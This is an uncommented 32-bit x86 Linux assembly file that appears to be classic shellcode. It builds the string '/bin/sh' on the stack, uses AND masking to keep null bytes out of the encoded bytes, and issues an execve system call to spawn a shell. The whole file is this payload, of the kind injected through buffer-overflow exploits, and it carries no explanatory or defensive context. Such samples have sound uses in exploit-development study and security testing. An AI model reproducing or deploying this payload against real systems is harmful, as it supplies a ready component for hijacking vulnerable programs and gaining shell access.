.globl _start

.text
_start:
	subl	$20, %esp
	xorl	%eax, %eax
	movl	%eax, 4(%esp)
	movl	$1852400175, 12(%esp)
	movl	$0xF068732F, 16(%esp)
	andl	$0x0F68732F, 16(%esp)
	xorl	%edx, %edx
	leal	12(%esp), %ebx
	movl	%ebx, 8(%esp)
	leal    4(%esp), %ecx
	movl	$0xF0F0F00B, %eax
	andl	$0x0F0F0FFF, %eax
	int	$0x80
